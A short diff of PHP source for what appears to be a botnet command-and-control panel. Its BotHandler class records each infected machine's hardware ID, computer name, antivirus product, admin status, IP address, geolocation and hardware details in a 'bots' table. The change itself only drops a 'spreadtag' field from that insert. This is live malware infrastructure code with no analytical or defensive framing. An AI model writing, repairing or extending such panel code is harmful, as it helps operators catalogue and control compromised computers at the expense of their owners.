@@ -198,7 +198,7 @@ class BotHandler
 
 
                 if(!empty($postbot["hwid"]) && !empty($postbot["computername"]) && !empty($postbot["botversion"])){
-                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, spreadtag, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                     if (!empty($postbot["antivirus"])) {
                         $avcheck = base64_decode($postbot["antivirus"]);
                     } else {
@@ -220,7 +220,6 @@ class BotHandler
                         $countryName,
                         $postbot["installedRam"],
                         base64_decode($postbot["gpuName"]),
-                        $postbot["spreadtag"],
                         base64_decode($postbot["cpuName"]),
                         $postbot["aornot"],
                         base64_decode($postbot["arch"]),
